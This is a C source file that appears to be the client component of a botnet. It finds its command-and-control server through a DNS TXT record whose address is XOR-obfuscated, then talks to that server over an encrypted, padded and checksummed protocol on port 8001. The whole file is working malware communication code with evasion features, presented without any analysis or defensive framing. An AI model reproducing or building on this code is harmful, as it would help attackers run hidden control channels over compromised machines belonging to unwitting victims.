#include <arpa/inet.h>
#include <arpa/nameser.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <poll.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#include "bot/client/client.h"
#include "bot/config/table.h"
#include "bot/definitions.h"
#include "bot/endianness.h"
#include "bot/resolver/resolver.h"
#include "bot/utils/bytebuf.h"
#include "bot/utils/fasthash.h"
#include "bot/utils/xoshiro.h"
#include "crypto/base64.h"
#include "crypto/chacha20.h"

bool client_resolve(pclient_t client, struct sockaddr_in *addr) {
  UNUSED_PARM(client);

  // query dns for txt record
  resolver_response_t res = {0};
  int ret = resolver_query(table_retrieve(TABLE_CNC_DOMAIN, NULL), &res, ns_t_txt);
  LOG_INFO("%s", table_retrieve(TABLE_CNC_DOMAIN, NULL));
  table_lock(TABLE_CNC_DOMAIN);
  if (ret < 0 || res.len == 0) {
    resolver_free(&res);
    return false;
  }

  // select random record
  char *txt_data = res.records[xoshiro_next() % res.len].txt;
  txt_data[strlen(txt_data)] = '\0';

  // decode the b64 string
  size_t b64_len;
  unsigned char *b64_data = base64_decode((unsigned char *)txt_data, strlen(txt_data), &b64_len);

  // if it fails, free and return false
  if (b64_data == NULL || b64_len < sizeof(uint32_t)) {
    LOG_ERROR("Failed to decode TXT record data");
    FREE_NULL(b64_data);
    resolver_free(&res);
    return false;
  }

  // extract addr with xor obf lol
  addr->sin_addr.s_addr = htonl(ntohl(*(uint32_t *)(b64_data)) ^ 0xCAFEBABE);
  LOG_INFO("Establishing connection to %s:%d", inet_ntoa(addr->sin_addr), ntohs(addr->sin_port));

  FREE_NULL(b64_data);
  resolver_free(&res);

  return true;
}

void client_connect(pclient_t client) {
  memset(client->key, '\0', sizeof(client->key));
  memset(client->nonce, '\0', sizeof(client->nonce));
  client->state = CLIENT_STATE_PENDING;

  struct sockaddr_in addr;
  addr.sin_family = AF_INET;
  addr.sin_port = htons(8001);

  if (!client_resolve(client, &addr)) {
    client_close(client);
    return;
  }

 // addr.sin_addr.s_addr = INET_ADDR(127,0,0,1);
  client->address = addr.sin_addr.s_addr;

  if ((client->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
    PRINTF("Could not initialize socket");
    return;
  }

  fcntl(client->fd, F_SETFL, O_NONBLOCK | fcntl(client->fd, F_GETFL, 0));
  int ret = connect(client->fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
  if (ret <= 0 && errno != EINPROGRESS) {
    PRINTF("Initializing connection failed: %d", ret);
    return;
  }

  client->last_recv = time(NULL);
}

void client_close(pclient_t client) {
  if (client->fd != -1) {
    close(client->fd);
    client->fd = -1;
  }

  if (client->state != CLIENT_STATE_PENDING) {
    LOG_WARN("Disconnected from server");
  }

  client->state = CLIENT_STATE_PENDING;
  sleep(5);
}

void client_events(pclient_t client, struct pollfd fd) {
  /* close connection if we haven't received anything in 30s */
  if (time(NULL) - client->last_recv >= (client->state == CLIENT_STATE_PENDING ? 25 : 120)) {
    LOG_ERROR("Connection timed out");
    client_close(client);
    return;
  }

  /* check if we successfully connected */
  if (client->state == CLIENT_STATE_PENDING && fd.revents & POLLOUT) {
    int err;
    socklen_t err_len = sizeof(err);

    if (getsockopt(client->fd, SOL_SOCKET, SO_ERROR, &err, &err_len) < 0 || err != 0) {
      LOG_ERROR("Connection failed (%s)", strerror(err));
      client_close(client);
      return;
    }

    // write hello command
    client_write(client, REQ_INIT, NULL);
    client->state = CLIENT_STATE_HANDOVER;

    LOG_INFO("Established connection to server");
  }

  /* handle incoming data (commands) */
  if (fd.revents & POLLIN) {
    if (!client_handle_states(client)) {
      LOG_ERROR("Error occurred while handling state, bailing -> %d", client->state);
      client_close(client);
    }

    // XD
  }
}

void client_write(pclient_t client, uint8_t command, pbytebuf_t buf) {
  // generate padding
  uint8_t padding_len = xoshiro_range(CLIENT_PADDING_MIN, CLIENT_PADDING_MAX) & 0xFF;
  uint8_t padding[CLIENT_PADDING_MAX] = {0};
  xoshiro_bytes(padding, padding_len);

  // create header
  client_header_t header = {
      .command = command,
      .padding = padding_len,
      .len = htons(buf ? buf->size : 0),
      .checksum = htonl(buf ? hash32(buf->buffer, buf->size, 0xDEADBEEF) : 0),
  };

  // encrypt header if we are above the key exchange
  if (client->state >= CLIENT_STATE_VERIFY) {
    chacha20_xor(client->key, 1, client->nonce, (uint8_t *)&header, (uint8_t *)&header,
                 sizeof(header));
  }

  // send header and padding
  send(client->fd, &header, sizeof(header), MSG_NOSIGNAL);
  send(client->fd, padding, padding_len, MSG_NOSIGNAL);

  // skip body writing if there is no data in the buffer
  if (buf == NULL || buf->size == 0) {
    return;
  }

  // encrypt and send the header if we are above the key exchange
  if (client->state >= CLIENT_STATE_VERIFY) {
    chacha20_xor(client->key, 1, client->nonce, buf->buffer, buf->buffer, buf->size);
  }

  send(client->fd, buf->buffer, buf->size, MSG_NOSIGNAL);
}

bool client_read(pclient_t client) {
  size_t ret = recv(client->fd, &client->hdr, sizeof(client->hdr), MSG_NOSIGNAL);
  if (ret < sizeof(client->hdr)) {
    return false;
  }

  // decrypt the header
  if (client->state >= CLIENT_STATE_VERIFY) {
    chacha20_xor(client->key, 1, client->nonce, (uint8_t *)&client->hdr, (uint8_t *)&client->hdr,
                 sizeof(client_header_t));
  }

  // convert back
  client->hdr.len = ntohs(client->hdr.len);
  client->hdr.checksum = ntohl(client->hdr.checksum);

  // read padding
  char padding[CLIENT_PADDING_MAX] = {0};
  ret = recv(client->fd, padding, client->hdr.padding, MSG_NOSIGNAL);
  if (ret < client->hdr.padding) return false;

  LOG_DEBUG("Received protocol message; command=%d, len=%d, padding_len=%d, checksum=%d",
            client->hdr.command, client->hdr.len, client->hdr.padding, client->hdr.checksum);

  client->last_recv = time(NULL);

  // allocate data, check if we can't alloc it
  if ((client->data = malloc(client->hdr.len)) == NULL) {
    return false;
  }

  // read body
  ret = recv(client->fd, client->data, client->hdr.len, MSG_NOSIGNAL);
  if (ret < client->hdr.len) {
    free(client->data);
    client->data = NULL;
    return false;
  }

  // decrypt body if needed
  if (client->state >= CLIENT_STATE_VERIFY) {
    chacha20_xor(client->key, 1, client->nonce, client->data, client->data, client->hdr.len);
  }

  // compare checksum
  if (hash32(client->data, client->hdr.len, 0xDEADBEEF) != client->hdr.checksum) {
    LOG_ERROR("Received checksum is invalid (%d)", client->hdr.checksum);

    free(client->data);
    client->data = NULL;
    return false;
  }

  return true;
}
